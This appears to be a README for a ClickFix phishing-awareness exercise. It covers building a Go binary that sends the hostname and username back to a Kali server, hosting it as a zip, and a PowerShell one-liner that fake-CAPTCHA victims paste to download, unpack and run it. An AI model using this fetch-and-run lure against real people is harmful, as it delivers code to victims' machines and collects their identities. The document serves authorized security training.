# ClickFix Training Payload (benign callback)

A safe end-to-end payload chain for the ClickFix awareness simulation. It mirrors
the *shape* of a real attack — **fetch zip → unpack → run binary** — but the binary
does nothing except send one HTTP check-in back to your Kali box so you can see
who ran it.

```
Victim (Windows)                         Kali (10.10.10.10)
  paste ClickFix command  ───────────►   server.py hosts payload.zip
  download payload.zip
  Expand-Archive
  run verify.exe          ───────────►   GET /callback?host=..&user=..
  "Verification complete."               logged to callbacks.log
```

Nothing malicious runs. `verify.exe` reads only the hostname + username, makes a
single GET request, prints a message, and exits. No disk writes, no persistence,
no command execution.

## Files

| File | Runs on | Purpose |
|------|---------|---------|
| `beacon.go`  | build on Kali → runs on victim | the benign callback binary source |
| `server.py`  | Kali | hosts `payload.zip` and logs callbacks |

## Setup (on the Kali machine)

1. **Set your IP.** Edit `beacon.go` and change `kaliServer` to your Kali IP:
   ```go
   const kaliServer = "http://10.10.10.10:8000"
   ```

2. **Build the Windows binary** (install Go first if needed: `sudo apt install golang-go`):
   ```bash
   GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o verify.exe beacon.go
   ```

3. **Package it into a zip:**
   ```bash
   zip payload.zip verify.exe
   ```

4. **Start the server** (hosts the zip + collects callbacks on port 8000):
   ```bash
   python3 server.py
   ```

## The ClickFix command (what goes on the victim's clipboard)

This is the realistic one-liner the fake CAPTCHA would copy. Replace the IP with
your Kali IP.

```powershell
$u='http://10.10.10.10:8000/payload.zip';$z="$env:TEMP\v.zip";$d="$env:TEMP\v";Invoke-WebRequest -Uri $u -OutFile $z;Expand-Archive -Path $z -DestinationPath $d -Force;Start-Process "$d\verify.exe"
```

What it does: download `payload.zip` to `%TEMP%`, expand it, and launch `verify.exe`.

## Running the exercise

1. `python3 server.py` on Kali.
2. Trainee opens the fake CAPTCHA page and follows the steps (Win+X → Shift+I →
   paste → Enter), pasting the command above into an elevated PowerShell.
3. `verify.exe` checks in; you see a green `>>> CALLBACK from ...` line in the
   server console and a new entry in `callbacks.log` identifying the machine/user.

## Notes & cleanup

- The elevated terminal (Win+X → Shift+I → **A** for admin on some layouts) is not
  actually needed for this benign binary — it runs fine unprivileged. It's kept in
  the instructions only because it matches the real lure.
- Leftover files on the victim: `%TEMP%\v.zip` and `%TEMP%\v\verify.exe`. Delete
  them after the exercise.
- Keep this to systems and people you are **authorized** to test.
